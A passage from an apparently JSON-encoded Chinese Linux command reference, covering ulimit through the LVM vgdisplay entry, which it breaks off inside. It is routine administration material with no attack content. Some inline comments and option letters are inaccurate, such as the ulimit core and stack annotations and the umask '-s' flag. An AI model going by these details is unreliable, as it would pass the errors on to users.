10M，这时系统的内存资源就会受到巨大的挑战。\n\n而实际应用的环境要比这种假设复杂的多，例如在一个嵌入式开发环境中，各方面的资源都是非常紧缺的，对于开启文件描述符的数量，分配堆栈的大 小，CPU 时间，虚拟内存大小，等等，都有非常严格的要求。资源的合理限制和分配，不仅仅是保证系统可用性的必要条件，也与系统上软件运行的性能有着密不可分的联 系。这时，ulimit 可以起到很大的作用，它是一种简单并且有效的实现资源限制的方式。\n\nulimit 用于限制 shell 启动进程所占用的资源，支持以下各种类型的限制：所创建的内核文件的大小、进程数据块的大小、Shell 进程创建文件的大小、内存锁住的大小、常驻内存集的大小、打开文件描述符的数量、分配堆栈的最大大小、CPU 时间、单个用户的最大线程数、Shell 进程所能使用的最大虚拟内存。同时，它支持硬资源和软资源的限制。\n\n作为临时限制，ulimit 可以作用于通过使用其命令登录的 shell 会话，在会话终止时便结束限制，并不影响于其他 shell 会话。而对于长期的固定限制，ulimit 命令语句又可以被添加到由登录 shell 读取的文件中，作用于特定的 shell 用户。\n\n### 语法  \n\n```\nulimit(选项)\n```\n\n### 选项  \n\n```\n-a：显示目前资源限制的设定；\n-c \u003ccore文件上限\u003e：设定core文件的最大值，单位为区块；\n-d \u003c数据节区大小\u003e：程序数据节区的最大值，单位为KB；\n-f \u003c文件大小\u003e：shell所能建立的最大文件，单位为区块；\n-H：设定资源的硬性限制，也就是管理员所设下的限制；\n-m \u003c内存大小\u003e：指定可使用内存的上限，单位为KB；\n-n \u003c文件数目\u003e：指定同一时间最多可开启的文件数；\n-p \u003c缓冲区大小\u003e：指定管道缓冲区的大小，单位512字节；\n-s \u003c堆叠大小\u003e：指定堆叠的上限，单位为KB；\n-S：设定资源的弹性限制；\n-t \u003cCPU时间\u003e：指定CPU使用时间的上限，单位为秒；\n-u \u003c程序数目\u003e：用户最多可开启的程序数目；\n-v \u003c虚拟内存大小\u003e：指定可使用的虚拟内存上限，单位为KB。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# ulimit -a\ncore file size          (blocks, -c) 0           #core文件的最大值为100 blocks。\ndata seg size           (kbytes, -d) unlimited   #进程的数据段可以任意大。\nscheduling priority             (-e) 0\nfile size               (blocks, -f) unlimited   #文件可以任意大。\npending signals                 (-i) 98304       #最多有98304个待处理的信号。\nmax locked memory       (kbytes, -l) 32          #一个任务锁住的物理内存的最大值为32KB。\nmax memory size         (kbytes, -m) unlimited   #一个任务的常驻物理内存的最大值。\nopen files                      (-n) 1024        #一个任务最多可以同时打开1024的文件。\npipe size            (512 bytes, -p) 8           #管道的最大空间为4096字节。\nPOSIX message queues     (bytes, -q) 819200      #POSIX的消息队列的最大值为819200字节。\nreal-time priority              (-r) 0\nstack size              (kbytes, -s) 10240       #进程的栈的最大值为10240字节。\ncpu time               (seconds, -t) unlimited   #进程使用的CPU时间。\nmax user processes              (-u) 98304       #当前用户同时打开的进程（包括线程）的最大个数为98304。\nvirtual memory          (kbytes, -v) unlimited   #没有限制进程的最大地址空间。\nfile locks                      (-x) unlimited   #所能锁住的文件的最大个数没有限制。\n```\n\n\n"},{"name":"umask","categoryId":6,"data":"umask\n\u003d\u003d\u003d\n\n用来设置限制新建文件权限的掩码\n\n## 补充说明\n\n**umask命令** 用来设置限制新建文件权限的掩码。当新文件被创建时，其最初的权限由文件创建掩码决定。用户每次注册进入系统时，umask命令都被执行， 并自动设置掩码mode来限制新文件的权限。用户可以通过再次执行umask命令来改变默认值，新的权限将会把旧的覆盖掉。\n\n### 语法  \n\n```\numask(选项)(参数)\n```\n\n### 选项  \n\n```\n-p：输出的权限掩码可直接作为指令来执行；\n-S：以符号方式输出权限掩码。\n```\n\n### 参数  \n\n权限掩码：指定权限掩码。\n\n### 实例  \n\n利用umask命令可以指定哪些权限将在新文件的默认权限中被删除。例如，可以使用下面的命令创建掩码，使得组用户的写权限，其他用户的读、写和执行权限都被取消：\n\n```\numask u\u003d, g\u003dw, o\u003drwx\n\n```\n\n执行该命令以后，对于下面创建的新文件，其文件主的权限未做任何改变，而组用户没有写权限，其他用户的所有权限都被取消。\n\n应注意：操作符“\u003d”在umask命令和chmod命令中的作用恰恰相反。在chmod命令中，利用它来设置指定的权限，而其余权限则被删除；但是在umask命令中，它将在原有权限的基础上删除指定的权限。\n\n不能直接利用umask命令创建一个可执行的文件，用户只能在其后利用chmod命令使它具有执行权限。假设执行了命令`umask u\u003d, g\u003dw, o\u003drwx`，虽然在命令行中，没有删去文件主和组用户的执行权限，但默认的文件权限还是640（即 rw-r-----），而不是750(rwxr-x---）。但是，如果创建的是目录或者通过编译程序创建的一个可执行文件，将不受此限制。在这种情况 下，会设置文件的执行权限。\n\n也可以使用八进制数值来设置mode。由于在umask中所指定的权限是要从文件中删除的，所以，如果该文件原来的初始化权限是777，那么执行命令umask 022以后，该文件的权限将变为755：如果该文件原来的初始化权限是666，那么该文件的权限将变为644。\n\n可以使用下面的命令检查新创建文件的默认权限：\n\n```\numask -s\n```\n\n选项-s表示以字符形式显示当前的掩码。如果直接输入umask命令，不带任何参数，那么将以八进制形式显示当前的掩码。系统默认的掩码是0022。\n\n\n"},{"name":"umount","categoryId":8,"data":"umount\n\u003d\u003d\u003d\n\n用于卸载已经加载的文件系统\n\n## 补充说明\n\n**umount命令** 用于卸载已经加载的文件系统。利用设备名或挂载点都能umount文件系统，不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。\n\n### 语法  \n\n```\numount(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：卸除/etc/mtab中记录的所有文件系统；\n-h：显示帮助；\n-n：卸除时不要将信息存入/etc/mtab文件中；\n-r：若无法成功卸除，则尝试以只读的方式重新挂入文件系统；\n-t\u003c文件系统类型\u003e：仅卸除选项中所指定的文件系统；\n-v：执行时显示详细的信息；\n-V：显示版本信息。\n```\n\n### 参数  \n\n文件系统：指定要卸载的文件系统或者其对应的设备文件名。\n\n### 实例  \n\n下面两条命令分别通过设备名和挂载点卸载文件系统，同时输出详细信息：\n\n通过设备名卸载\n\n```\numount -v /dev/sda1\n/dev/sda1 umounted\n```\n\n通过挂载点卸载\n\n```\numount -v /mnt/mymount/\n/tmp/diskboot.img umounted\n```\n\n如果设备正忙，卸载即告失败。卸载失败的常见原因是，某个打开的shell当前目录为挂载点里的某个目录：\n\n```\numount -v /mnt/mymount/\numount: /mnt/mymount: device is busy\numount: /mnt/mymount: device is busy\n```\n\n有时，导致设备忙的原因并不好找。碰到这种情况时，可以用lsof列出已打开文件，然后搜索列表查找待卸载的挂载点：\n\n```\nlsof | grep mymount         查找mymount分区里打开的文件\nbash   9341  francois  cwd   DIR   8,1   1024    2 /mnt/mymount\n```\n\n从上面的输出可知，mymount分区无法卸载的原因在于，francois运行的PID为9341的bash进程。\n\n对付系统文件正忙的另一种方法是执行延迟卸载：\n\n```\numount -vl /mnt/mymount/     执行延迟卸载\n```\n\n延迟卸载（lazy unmount）会立即卸载目录树里的文件系统，等到设备不再繁忙时才清理所有相关资源。卸载可移动存储介质还可以用eject命令。下面这条命令会卸载cd并弹出CD：\n\n```\neject /dev/cdrom      卸载并弹出CD \n```\n\n\n"},{"name":"unalias","categoryId":4,"data":"unalias\n\u003d\u003d\u003d\n\n删除由alias设置的别名\n\n## 补充说明\n\n**unalias命令** 用来取消命令别名，是为shell内建命令。如果需要取消任意一个命令别名，则使用该命令别名作为指令的参数选项即可。如果使用`-a`选项，则表示取消所有已经存在的命令别名。\n\n### 语法  \n\n```\nunalias(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：取消所有命令别名。\n```\n\n### 参数  \n\n命令别名：指定要取消的命令别名。\n\n### 实例  \n\n使用unalias命令将已经设置的命令别名\"cc\"取消，输入如下命令：\n\n```\nunalias cc            #取消已经设置的命令别名\n```\n\n上面的命令执行后，系统会将指定的命令别名取消掉。如果用户再使用该命令别名时，系统将提示如下信息：\n\n```\ncc：no input files\n```\n\n因此，当使用该指令将命令别名取消后，将不能够再进行使用。否则，将出现错误提示。\n\n\n"},{"name":"uname","categoryId":2,"data":"uname\n\u003d\u003d\u003d\n\n显示Linux系统信息\n\n## 补充说明\n\n**uname命令** 用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。\n\n### 语法  \n\n```\nuname(选项)\n```\n\n### 选项  \n\n```\n-a或--all：显示全部的信息；\n-m或--machine：显示电脑类型；\n-n或-nodename：显示在网络上的主机名称；\n-r或--release：显示操作系统的发行编号；\n-s或--sysname：显示操作系统名称；\n-v：显示操作系统的版本；\n-p或--processor：输出处理器类型或\"unknown\"；\n-i或--hardware-platform：输出硬件平台或\"unknown\"；\n-o或--operating-system：输出操作系统名称；\n--help：显示帮助；\n--version：显示版本信息。\n```\n\n### 实例  \n\n使用uname命令查看全部信息：\n\n```\n[root@localhost ~]# uname    #单独使用uname命令时相当于uname -s\nLinux\n\n[root@localhost ~]# uname -a\nLinux localhost 2.6.18-348.6.1.el5 #1 SMP Tue May 21 15:34:22 EDT 2013 i686 i686 i386 GNU/Linux\n\n[root@localhost ~]# uname -m\ni686\n\n[root@localhost ~]# uname -n\nlocalhost\n\n[root@localhost ~]# uname -r\n2.6.18-4-686\n\n[root@localhost ~]# uname -s\nLinux\n\n[root@localhost ~]# uname -v\n#1 SMP Tue May 21 15:34:22 EDT 2013\n\n[root@localhost ~]# uname -p\ni686\n\n[root@localhost ~]# uname -i\ni386\n\n[root@localhost ~]# uname -o\nGNU/Linux\n\n[root@localhost ~]# uname --version\nuname (GNU coreutils) 5.97\nCopyright (C) 2006 free Software Foundation, Inc.\n这是自由软件。您可以按照 GNU GPL 协议 \u003chttp://www.gnu.org/licenses/gpl.html\u003e 的条款再发布此软件的副本，但我们无法保证相关法律不对这一情形进行限制。\n\n由 David MacKenzie 编写。\n```\n\n\n"},{"name":"unarj","categoryId":10,"data":"unarj\n\u003d\u003d\u003d\n\n解压缩由arj命令创建的压缩包\n\n## 补充说明\n\n**unarj命令** 用来解压缩由arj命令创建的压缩包。\n\n### 语法  \n\n```\nunarj(选项)(参数)\n```\n\n### 选项  \n\n```\ne：解压缩.arj文件；\nl：显示压缩文件内所包含的文件；\nt：检查压缩文件是否正确；\nx：解压缩时保留原有的路径。\n```\n\n### 参数  \n\n.arj压缩包：指定要解压缩的.arj压缩包。\n\n\n"},{"name":"uncompress","categoryId":0,"data":"uncompress\n\u003d\u003d\u003d\n\n用来解压.Z文件\n\n## 补充说明\n\n**uncompress命令** 用来解压缩由compress命令压缩后产生的“.Z”压缩包。\n\n### 语法  \n\n```\nuncompress(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：不提示用户，强制覆盖掉目标文件；\n-c：将结果送到标准输出，无文件被改变；\n-r：递归的操作方式。\n```\n\n### 参数  \n\n文件：指定要压缩的“.Z”压缩包。\n\n### 实例  \n\n先创建一个.Z压缩文件\n\n```\ncompress FileName\n```\n\n解压：\n\n```\nuncompress FileName.Z\n```\n\n\n"},{"name":"unexpand","categoryId":0,"data":"unexpand\n\u003d\u003d\u003d\n\n将文件的空白字符转换为制表符\n\n## 补充说明\n\n**unexpand命令** 用于将给定文件中的空白字符（space）转换为制表符（TAB），并把转换结果显示在标准输出设备（显示终端）。\n\n### 语法  \n\n```\nunexpand(选项)(参数)\n```\n\n### 选项  \n\n```\n-a或--all：转换文件中所有的空白字符；\n--first-only：仅转换开头的空白字符；\n-t\u003cN\u003e：指定TAB所代表的N个（N为整数）字符数，默认N值是8。\n```\n\n### 参数  \n\n文件：指定要转换空白为TAB的文件列表。\n\n\n"},{"name":"uniq","categoryId":1,"data":"uniq\n\u003d\u003d\u003d\n\n报告或忽略文件中的重复行\n\n## 补充说明\n\n**uniq命令** 用于报告或忽略文件中的重复行，一般与sort命令结合使用。\n\n### 语法  \n\n```\nuniq(选项)(参数)\n```\n\n### 选项  \n\n```\n-c或——count：在每列旁边显示该行重复出现的次数；\n-d或--repeated：仅显示重复出现的行列；\n-f\u003c栏位\u003e或--skip-fields\u003d\u003c栏位\u003e：忽略比较指定的栏位；\n-s\u003c字符位置\u003e或--skip-chars\u003d\u003c字符位置\u003e：忽略比较指定的字符；\n-u或——unique：仅显示出一次的行列；\n-w\u003c字符位置\u003e或--check-chars\u003d\u003c字符位置\u003e：指定要比较的字符。\n```\n\n### 参数  \n\n*   输入文件：指定要去除的重复行文件。如果不指定此项，则从标准读取数据；\n*   输出文件：指定要去除重复行后的内容要写入的输出文件。如果不指定此选项，则将内容显示到标准输出设备（显示终端）。\n\n### 实例  \n\n删除重复行：\n\n```\nuniq file.txt\nsort file.txt | uniq\nsort -u file.txt\n\n```\n\n只显示单一行：\n\n```\nuniq -u file.txt\nsort file.txt | uniq -u\n```\n\n统计各行在文件中出现的次数：\n\n```\nsort file.txt | uniq -c\n```\n\n在文件中找出重复的行：\n\n```\nsort file.txt | uniq -d\n```\n\n\n"},{"name":"unlink","categoryId":0,"data":"unlink\n\u003d\u003d\u003d\n\n系统调用函数unlink去删除指定的文件\n\n## 补充说明\n\n**unlink命令** 用于系统调用函数unlink去删除指定的文件。和rm命令作用一样，都是删除文件。\n\n### 语法  \n\n```\nunlink(选项)(参数)\n```\n\n### 选项  \n\n```\n--help：显示帮助；\n--version：显示版本号。\n```\n\n### 参数  \n\n文件：指定要删除的文件。\n\n\n"},{"name":"unprotoize","categoryId":0,"data":"unprotoize\n\u003d\u003d\u003d\n\n删除C语言源代码文件中的函数原型\n\n## 补充说明\n\n**unprotoize命令** 属于gcc套件，用于删除C语言源代码文件中的函数原型。\n\n### 语法  \n\n```\nunprotoize(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：设置需要转换代码的目录；\n-x：转换代码时排除的文件。\n```\n\n### 参数  \n\n文件：需要转换代码的C语言源文件。\n\n\n"},{"name":"unset","categoryId":4,"data":"unset\n\u003d\u003d\u003d\n\n删除指定的shell变量或函数\n\n## 补充说明\n\n**unset命令** 用于删除已定义的shell变量（包括环境变量）和shell函数。unset命令不能够删除具有只读属性的shell变量和环境变量。\n\n### 语法  \n\n```\nunset(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：仅删除函数；\n-v：仅删除变量。\n```\n\n### 参数  \n\nshell变量或函数：指定要删除的shell变量或shell函数。\n\n### 实例  \n\n使用unset命令将前面所创建的环境变量mylove及其对应的值进行删除，输入如下命令：\n\n```\nunset -v mylove         #删除指定的环境变量\n```\n\n执行以上命令后，系统将删除指定的环境变量。用户可以使用env命令和grep命令对其进行查询。已经删除的环境变量再次使用指令查询时，将出现查询不到指定环境变量的输出信息。\n\n\n"},{"name":"unzip","categoryId":10,"data":"unzip\n\u003d\u003d\u003d\n\n用于解压缩由zip命令压缩的压缩包\n\n## 补充说明\n\n**unzip命令** 用于解压缩由zip命令压缩的“.zip”压缩包。\n\n### 语法  \n\n```\nunzip(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：将解压缩的结果显示到屏幕上，并对字符做适当的转换；\n-f：更新现有的文件；\n-l：显示压缩文件内所包含的文件；\n-p：与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换；\n-t：检查压缩文件是否正确；\n-u：与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中；\n-v：执行时显示详细的信息；\n-z：仅显示压缩文件的备注文字；\n-a：对文本文件进行必要的字符转换；\n-b：不要对文本文件进行字符转换；\n-C：压缩文件中的文件名称区分大小写；\n-j：不处理压缩文件中原有的目录路径；\n-L：将压缩文件中的全部文件名改为小写；\n-M：将输出结果送到more程序处理；\n-n：解压缩时不要覆盖原有的文件；\n-o：不必先询问用户，unzip执行后覆盖原有的文件；\n-P\u003c密码\u003e：使用zip的密码选项；\n-q：执行时不显示任何信息；\n-s：将文件名中的空白字符转换为底线字符；\n-V：保留VMS的文件版本信息；\n-X：解压缩时同时回存文件原来的UID/GID；\n-d\u003c目录\u003e：指定文件解压缩后所要存储的目录；\n-x\u003c文件\u003e：指定不要处理.zip压缩文件中的哪些文件；\n-Z：unzip-Z等于执行zipinfo指令。\n```\n\n### 参数  \n\n压缩包：指定要解压的“.zip”压缩包。\n\n### 实例  \n\n将压缩文件text.zip在当前目录下解压缩。\n\n```\nunzip test.zip\n```\n\n将压缩文件text.zip在指定目录`/tmp`下解压缩，如果已有相同的文件存在，要求unzip命令不覆盖原先的文件。\n\n```\nunzip -n test.zip -d /tmp\n```\n\n查看压缩文件目录，但不解压。\n\n```\nunzip -v test.zip\n```\n\n将压缩文件test.zip在指定目录`/tmp`下解压缩，如果已有相同的文件存在，要求unzip命令覆盖原先的文件。\n\n```\nunzip -o test.zip -d tmp/\n```\n\n\n"},{"name":"updatedb","categoryId":0,"data":"updatedb\n\u003d\u003d\u003d\n\n创建或更新slocate命令所必需的数据库文件\n\n## 补充说明\n\n**updatedb命令** 用来创建或更新slocate命令所必需的数据库文件。updatedb命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入slocate数据库文件中。\n\n补充说明：slocate本身具有一个数据库，里面存放了系统中文件与目录的相关信息。\n\n### 语法  \n\n```\nupdatedb(选项)\n```\n\n### 选项  \n\n```\n-o\u003c文件\u003e：忽略默认的数据库文件，使用指定的slocate数据库文件；\n-U\u003c目录\u003e：更新指定目录的slocate数据库；\n-v：显示执行的详细过程。\n```\n\n### 实例  \n\n实用updatedb命令的`-U`选项可以指定要更新slocate数据库的目录。\n\n```\nupdatedb -U /usr/local/  更新指定命令的slocate数据库\n```\n\n\n"},{"name":"uptime","categoryId":0,"data":"uptime\n\u003d\u003d\u003d\n\n查看Linux系统负载信息\n\n## 补充说明\n\n**uptime命令** 能够打印系统总共运行了多长时间和系统的平均负载。uptime命令可以显示的信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1分钟、5分钟和15分钟内的平均负载。\n\n### 语法  \n\n```\nuptime(选项)\n```\n\n### 选项  \n\n```\n-V：显示指令的版本信息。\n```\n\n### 实例  \n\n使用uptime命令查看系统负载：\n\n```\n[root@LinServ-1 ~]# uptime -V    #显示uptime命令版本信息\nprocps version 3.2.7\n\n[root@LinServ-1 ~]# uptime\n 15:31:30 up 127 days,  3:00,  1 user,  load average: 0.00, 0.00, 0.00\n```\n\n **显示内容说明：** \n\n```\n15:31:30             //系统当前时间\nup 127 days,  3:00   //主机已运行时间,时间越大，说明你的机器越稳定。\n1 user               //用户连接数，是总连接数而不是用户数\nload average: 0.00, 0.00, 0.00         // 系统平均负载，统计最近1，5，15分钟的系统平均负载\n```\n\n那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。\n\n如果每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。\n\n如果你的linux主机是1个双核CPU的话，当Load Average 为6的时候说明机器已经被充分使用了。\n\n\n"},{"name":"useradd","categoryId":2,"data":"useradd\n\u003d\u003d\u003d\n\n创建的新的系统用户\n\n## 补充说明\n\n**useradd命令** 用于Linux中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。使用useradd指令所建立的帐号，实际上是保存在`/etc/passwd`文本文件中。\n\n在Slackware中，adduser指令是个script程序，利用交谈的方式取得输入的用户帐号资料，然后再交由真正建立帐号的useradd命令建立新用户，如此可方便管理员建立用户帐号。在Red Hat Linux中， **adduser命令** 则是useradd命令的符号连接，两者实际上是同一个指令。\n\n### 语法  \n\n```\nuseradd(选项)(参数)\n```\n\n### 选项  \n\n```\n-c\u003c备注\u003e：加上备注文字。备注文字会保存在passwd的备注栏位中；\n-d\u003c登入目录\u003e：指定用户登入时的启始目录；\n-D：变更预设值；\n-e\u003c有效期限\u003e：指定帐号的有效期限；\n-f\u003c缓冲天数\u003e：指定在密码过期后多少天即关闭该帐号；\n-g\u003c群组\u003e：指定用户所属的群组；\n-G\u003c群组\u003e：指定用户所属的附加群组；\n-m：自动建立用户的登入目录；\n-M：不要自动建立用户的登入目录；\n-n：取消建立以用户名称为名的群组；\n-r：建立系统帐号；\n-s\u003cshell\u003e：指定用户登入后所使用的shell；\n-u\u003cuid\u003e：指定用户id。\n```\n\n### 参数  \n\n用户名：要创建的用户名。\n\n### 实例  \n\n新建用户加入组：\n\n```\nuseradd –g sales jack –G company,employees    //-g：加入主要组、-G：加入次要组\n```\n\n建立一个新用户账户，并设置ID：\n\n```\nuseradd caojh -u 544\n```\n\n需要说明的是，设定ID值时尽量要大于500，以免冲突。因为Linux安装后会建立一些特殊用户，一般0到499之间的值留给bin、mail这样的系统账号。\n\n\n"},{"name":"userdel","categoryId":2,"data":"userdel\n\u003d\u003d\u003d\n\n用于删除给定的用户以及与用户相关的文件\n\n## 补充说明\n\n**userdel命令** 用于删除给定的用户，以及与用户相关的文件。若不加选项，则仅删除用户帐号，而不删除相关文件。\n\n### 语法  \n\n```\nuserdel(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：强制删除用户，即使用户当前已登录；\n-r：删除用户的同时，删除与用户相关的所有文件。\n```\n\n### 参数  \n\n用户名：要删除的用户名。\n\n### 实例  \n\nuserdel命令很简单，比如我们现在有个用户linuxde，其家目录位于`/var`目录中，现在我们来删除这个用户：\n\n```\nuserdel linuxde       //删除用户linuxde，但不删除其家目录及文件；\nuserdel -r linuxde    //删除用户linuxde，其家目录及文件一并删除；\n```\n\n请不要轻易用`-r`选项；他会删除用户的同时删除用户所有的文件和目录，切记如果用户目录下有重要的文件，在删除前请备份。\n\n其实也有最简单的办法，但这种办法有点不安全，也就是直接在`/etc/passwd`中删除您想要删除用户的记录；但最好不要这样做，`/etc/passwd`是极为重要的文件，可能您一不小心会操作失误。\n\n\n"},{"name":"usermod","categoryId":2,"data":"usermod\n\u003d\u003d\u003d\n\n用于修改用户的基本信息\n\n## 补充说明\n\n**usermod命令** 用于修改用户的基本信息。usermod命令不允许你改变正在线上的使用者帐号名称。当usermod命令用来改变user id，必须确认这名user没在电脑上执行任何程序。你需手动更改使用者的crontab档。也需手动更改使用者的at工作档。采用NIS server须在server上更动相关的NIS设定。\n\n### 语法  \n\n```\nusermod(选项)(参数)\n```\n\n### 选项  \n\n```\n-c\u003c备注\u003e：修改用户帐号的备注文字；\n-d\u003c登入目录\u003e：修改用户登入时的目录；\n-e\u003c有效期限\u003e：修改帐号的有效期限；\n-f\u003c缓冲天数\u003e：修改在密码过期后多少天即关闭该帐号；\n-g\u003c群组\u003e：修改用户所属的群组；\n-G\u003c群组\u003e；修改用户所属的附加群组；\n-l\u003c帐号名称\u003e：修改用户帐号名称；\n-L：锁定用户密码，使密码无效；\n-s\u003cshell\u003e：修改用户登入后所使用的shell；\n-u\u003cuid\u003e：修改用户ID；\n-U:解除密码锁定。\n```\n\n### 参数  \n\n登录名：指定要修改信息的用户登录名。\n\n### 实例  \n\n将newuser2添加到组staff中：\n\n```\nusermod -G staff newuser2\n```\n\n修改newuser的用户名为newuser1：\n\n```\nusermod -l newuser1 newuser\n```\n\n锁定账号newuser1：\n\n```\nusermod -L newuser1\n```\n\n解除对newuser1的锁定：\n\n```\nusermod -U newuser1\n```\n\n\n"},{"name":"usernetctl","categoryId":0,"data":"usernetctl\n\u003d\u003d\u003d\n\n被允许时操作指定的网络接口\n\n## 补充说明\n\n**usernetctl命令** 在用于被允许时操作指定的网络接口。\n\n### 语法  \n\n```\nusernetctl(参数)\n```\n\n### 参数  \n\n*   网络接口：被操纵的网络接口；\n*   up：激活网络接口；\n*   down：禁用网络接口；\n*   report：报告网络接口状态。\n\n\n"},{"name":"users","categoryId":0,"data":"users\n\u003d\u003d\u003d\n\n显示当前登录系统的所有用户\n\n## 补充说明\n\n**users命令** 用于显示当前登录系统的所有用户的用户列表。每个显示的用户名对应一个登录会话。如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数。\n\n### 语法  \n\n```\nusers(选项)\n```\n\n### 选项  \n\n```\n--help：显示命令的帮助信息；\n--version：显示命令的版本信息。\n```\n\n### 实例  \n\n```\n[root@localhost ~]# users\nroot root\n```\n\n\n"},{"name":"vdfuse","categoryId":0,"data":"vdfuse\n\u003d\u003d\u003d\n\nVirtualBox软件挂载VDI分区文件工具\n\n## 补充说明\n\n**vdfuse命令** 是VirtualBox软件挂载VDI分区文件的一个工具，VirtualBox是一款能创建虚拟机的开源软件，vdi是它的默认磁盘格式。\n\n### 什么是VirtualBox  \n\nVirtualBox是一款功能强大的x86虚拟机软件，它不仅具有丰富的特色，而且性能也很优异。更可喜的是，VirtualBox于数日前走向开源，成为了一个发布在GPL许可之下的自由软件。VirtualBox可以在Linux和Windows主机中运行，并支持在其中安装Windows (NT 4.0、2000、XP、Server 2003、Vista)、DOS/Windows 3.x、Linux (2.4 和 2.6)、OpenBSD等系列的客户操作系统。\n\n **在Ubuntu中安装vdfuse，打开终端，输入：** \n\n```\nsudo apt-get install virtualbox-fuse\n```\n\n### 语法  \n\n```\nvdfuse [options] -f image-file mountpoint\n```\n\n### 选项  \n\n```\n-h 帮助\n-r 只读\n-t 类型 (VDI, VMDK, VHD, or raw; default: auto)\n-f 镜像文件\n-a 允许所有用户读取\n-w 允许所有用户都写\n-g 前台运行\n-v 输出反馈\n-d debug模式\n```\n\n注意：必须编辑一下`/etc/fuse.confand`，去掉 \"user_allow_other\" 前面的注释符号（#），否则不能正确运行。\n\n### 实例  \n\n使用如下如下语句挂载.vdi文件：\n\n```\nsudo vdfuse -f /path/to/file.vdi /path/to/mountpoint\n```\n\n`/path/to/mountpoint`应该包含如下文件EntireDisk、Partition1等，如果只有一个文件，你可能需要这样挂载：\n\n```\nmount /path/to/mountpoint/Partition1 /path/to/someother/mountpoint\n```\n\n文件系统就挂载到`/path/to/someother/mountpoint`了。\n\n\n"},{"name":"vgchange","categoryId":0,"data":"vgchange\n\u003d\u003d\u003d\n\n修改卷组属性\n\n## 补充说明\n\n**vgchange命令** 用于修改卷组的属性，经常被用来设置卷组是处于活动状态或非活动状态。处于活动状态的卷组无法被删除，必须使用vgchange命令将卷组设置为非活动状态后才能删除。\n\n### 语法  \n\n```\nvgchange(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：设置卷组的活动状态。\n```\n\n### 参数  \n\n卷组：指定要设置属性的卷组。\n\n### 实例  \n\n使用vgchange命令将卷组状态改为活动的。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgchange -ay vg1000     #将卷组\"vg1000\"设置为活动状态\n```\n\n输出信息如下：\n\n```\n1 logical volume(s) in volume group \"vg1000\" now active\n```\n\n\n"},{"name":"vgconvert","categoryId":0,"data":"vgconvert\n\u003d\u003d\u003d\n\n转换卷组元数据格式\n\n## 补充说明\n\n**vgconvert命令** 用于转换指定LVM卷组的元数据格式，通常将“LVM1”格式的卷组转换为“LVM2”格式。转换卷组元数据前必须保证卷组处于非活动状态，否则无法完成转换操作。\n\n### 语法  \n\n```\nvgconvert(选项)(参数)\n```\n\n### 选项  \n\n```\n-M：要转换的卷组格式。\n```\n\n### 参数  \n\n卷组：指定要转换格式的卷组。\n\n### 实例  \n\n转换卷组元数据格式前，使用vgchange命令将卷组设置为非活动状态。在命令行中输入下面的命令：\n\n```\n[root@localhost lvm]# vgchange -an vg1000    #设置卷组状态为非活动状态\n0 logical volume(s) in volume group \"vg1000\" now active \n\n```\n\n使用vgconvert命令将卷组\"vg1000\"从\"LVM1\"格式转换为\"LVM2\"格式。在命令行中输入下面的命令：\n\n```\n[root@localhost lvm]# vgconvert -M2 vg1000    #转换卷组为\"LVM2\"格式\nVolume group vg1000 successfully converted\n```\n\n使用vgchange命令将卷组设置为活动状态。在命令行中输入下面的命令：\n\n```\n[root@localhost lvm]# vgchange -ay vg1000     #设置卷组状态为活动状态\n0 logical volume(s) in volume group \"vg1000\" now active\n```\n\n\n"},{"name":"vgcreate","categoryId":0,"data":"vgcreate\n\u003d\u003d\u003d\n\n用于创建LVM卷组\n\n## 补充说明\n\n**vgcreate命令** 用于创建LVM卷组。卷组（Volume Group）将多个物理卷组织成一个整体，屏蔽了底层物理卷细节。在卷组上创建逻辑卷时不用考虑具体的物理卷信息。\n\n### 语法  \n\n```\nvgcreate(选项)(参数)\n```\n\n### 选项  \n\n```\n-l：卷组上允许创建的最大逻辑卷数；\n-p：卷组中允许添加的最大物理卷数；\n-s：卷组上的物理卷的PE大小。\n```\n\n### 参数  \n\n*   卷组名：要创建的卷组名称；\n*   物理卷列表：要加入到卷组中的物理卷列表。\n\n### 实例  \n\n使用vgcreate命令创建卷组 \"vg1000\"，并且将物理卷`/dev/sdb1`和`/dev/sdb2`添加到卷组中。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgcreate vg1000 /dev/sdb1 /dev/sdb2  #创建卷组\"vg1000\"\n```\n\n输出信息如下：\n\n```\nVolume group \"vg1000\" successfully created\n```\n\n\n"},{"name":"vgdisplay","categoryId":0,"data":"vgdisplay\n\u003d\u003d\u003d\n\n显示LVM卷组的信息\n\n## 补充说明\n\n**vgdisplay命令** 用于显示LVM卷组的信息。如果不指定\"卷组\"参数，则分别显示所有卷组的属性。\n\n### 语法  \n\n```\nvgdisplay(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：仅显示活动卷组的属性；\n-s：使用短格式输出的信息。\n```\n\n### 参数  \n\n卷组：要显示属性的卷组名称。\n\n### 实例  \n\n使用vgdisplay命令显示存在的卷组\"vg1000\"的属性。在命令行中输入下面的命令：\n\n```\n[root@localhost ~]# vgdisplay vg1000     #显示卷组\"vg1000\"的属性\n```\n\n输出信息如下：\n\n```\n  --- Volume group ---  \n  VG Name               vg1000  \n......省略部分输出内容......  \n  free  PE / Size       50 / 200.00 MB  \n  VG UUID  